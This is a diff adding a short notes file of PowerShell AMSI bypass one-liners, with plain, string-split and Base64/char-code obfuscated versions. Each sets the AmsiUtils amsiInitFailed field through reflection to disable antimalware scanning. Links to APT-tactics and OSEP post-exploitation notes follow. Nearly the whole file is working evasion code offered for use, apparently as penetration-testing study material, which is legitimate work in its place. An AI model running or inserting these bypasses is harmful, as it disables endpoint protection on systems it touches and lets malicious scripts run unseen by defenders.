@@ -1,0 +1,13 @@
+Basic AMSI Bypass,
+(([Ref].Assembly.gettypes() | ? {$_.Name -like "Amsi*utils"}).GetFields("NonPublic,Static") | ? {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)
+
+Basic AMSI Bypass & Obfuscated AMSI Bypass,
+$t=[Ref].Assembly.GetType(('System.Manage'+'ment.Automa'+'tion.AmsiUtils'));$f=$t.GetField(('amsiIn'+'itFailed'),'NonPublic,Static');$f.SetValue($null,$true)
+
+$s=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM='));
+$t=[Ref].Assembly.GetType($s);
+$t.GetField([System.Text.Encoding]::ASCII.GetString((97,109,115,105,73,110,105,116,70,97,105,108,101,100)),'NonPublic,Static').SetValue($null,$true);
+
+See,
+https://medium.com/@0xHossam/powershell-exploits-modern-apts-and-their-malicious-scripting-tactics-7f98b0e8090c
+https://steffinstanly.gitbook.io/osep-notes/osep/post-exploitation/amsi-clm-and-app-locker
